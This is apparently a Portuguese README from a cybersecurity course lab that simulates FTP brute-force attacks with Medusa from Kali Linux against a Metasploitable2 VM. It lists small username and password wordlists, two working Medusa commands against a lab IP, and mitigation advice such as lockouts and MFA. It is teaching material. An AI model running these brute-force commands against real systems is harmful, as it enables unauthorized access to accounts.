# Desafio: Simulação de Ataques de Força Bruta (Simples)

> Projeto simples para demonstrar ataques de força bruta em ambiente controlado usando Kali Linux, Medusa e máquinas vulneráveis (Metasploitable2).

---

## ✅ Objetivo

Simular ataques de força bruta em serviços FTP e registrar comandos, wordlists usadas, evidências e propor recomendações de mitigação.

## 🧰 Ferramentas e imagens

* Kali Linux (VM)
* Metasploitable2 (VM)
* Medusa (Kali)
* Wordlists simples

---

## Estrutura do repositório

```
├─ README.md
├─ wordlists/
│  ├─ users.txt
│  └─ pass.txt
└─ commands.txt
```

---

## Configuração das VMs

1. Criar 2 VMs no VirtualBox: Kali Linux e Metasploitable2.
2. Iniciar ambas as VMs e confirmar IPs com `ifconfig` / `ip a`.

---

## Wordlists

**wordlists/users.txt**

```
admin
user
guest
test
root
```

**wordlists/pass.txt**

```
123456
password
admin
root
1234
qwerty
```

---

### 1) Força bruta em FTP (Medusa)

```bash
# Usuário único
medusa -h 192.168.56.101 -u ftpuser -P wordlists/pass.txt -M ftp

# Lista de usuários + senhas
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/pass.txt -M ftp
```

**O que verificar:** conexão estabelecida, login bem-sucedido exibido no output do Medusa, acesso ao diretório ftp após credenciais encontradas.

---

## Recomendações de mitigação

* Implementar políticas de senhas fortes.
* Bloqueio gradual ou temporário após múltiplas tentativas falhas.
* Habilitar autenticação multifator (MFA).
* Monitoramento e alertas para tentativas repetidas de login.

---

## Observações finais

* **Atenção legal:** Esses testes foram elaborados em ambiente controlado para fins didáticos durante a participação no curso de Cyber Security da DIO.